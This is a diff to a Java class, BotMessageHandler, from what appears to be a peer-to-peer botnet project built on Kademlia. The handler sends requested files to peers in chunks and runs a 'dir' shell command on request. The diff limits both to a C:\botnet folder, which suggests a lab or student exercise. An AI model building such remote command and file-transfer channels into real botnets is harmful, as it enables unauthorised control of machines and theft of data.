@@ -17,12 +17,14 @@ import static botnet_p2p.MessageOuterClass.Message;
 
 class BotMessageHandler {
     private static final Logger logger = LogManager.getLogger(BusinessLogicLayer.class);
-    private static final int CHUNK_SIZE = 128;
+    private static final int CHUNK_SIZE = 4;
     private P2pLayer p2pLayer;
+    private ChunkReader chunkReader;
     private KademliaPeer me;
 
-    BotMessageHandler(P2pLayer p2pLayer, KademliaPeer me) {
+    BotMessageHandler(P2pLayer p2pLayer, ChunkReader chunkReader, KademliaPeer me) {
         this.p2pLayer = p2pLayer;
+        this.chunkReader = chunkReader;
         this.me = me;
     }
 
@@ -51,14 +53,20 @@ class BotMessageHandler {
         KademliaPeer sender = KademliaPeer.fromContact(message.getSender());
         String path = message.getFileRequest().getPath();
 
+        if(!path.startsWith("C:\\botnet")) {
+            logger.error("this path is not allowed");
+            return;
+        }
+
         String fileName = getFileName(path);
         FileReader fileReader = new FileReader();
         FileReader.ChunkedFile chunkedFile = fileReader.readFile(path, CHUNK_SIZE);
+        String uuid = UUID.randomUUID().toString();
 
         List<byte[]> chunks = chunkedFile.chunks;
         for (int i = 0; i < chunks.size(); i++) {
             Message.FileChunkMsg fileChunkMsg = Message.FileChunkMsg.newBuilder()
-                    .setUuid(UUID.randomUUID().toString())
+                    .setUuid(uuid)
                     .setFileName(fileName)
                     .setFileSize(chunkedFile.fileSize)
                     .setOrdinal(i)
@@ -67,6 +75,12 @@ class BotMessageHandler {
             p2pLayer.fileChunk(sender, me, fileChunkMsg);
         }
 
+    }
+
+    void handleFileChunkMessage(Message messsage) {
+        KademliaPeer sender = KademliaPeer.fromContact(messsage.getSender());
+        Message.FileChunkMsg fileChunk = messsage.getFileChunk();
+        chunkReader.read(fileChunk, sender);
     }
 
     public String getFileName(String path) {
@@ -83,7 +97,7 @@ class BotMessageHandler {
     String executeSystemCommand(String command) {
         if ("dir".equals(command)) {
             try {
-                Process exec = Runtime.getRuntime().exec("cmd /c dir");
+                Process exec = Runtime.getRuntime().exec("cmd /c dir C:\\botnet");
                 exec.waitFor();
                 if (exec.exitValue() != 0) {
                     return null;
@@ -97,4 +111,5 @@ class BotMessageHandler {
         }
         return null;
     }
+
 }
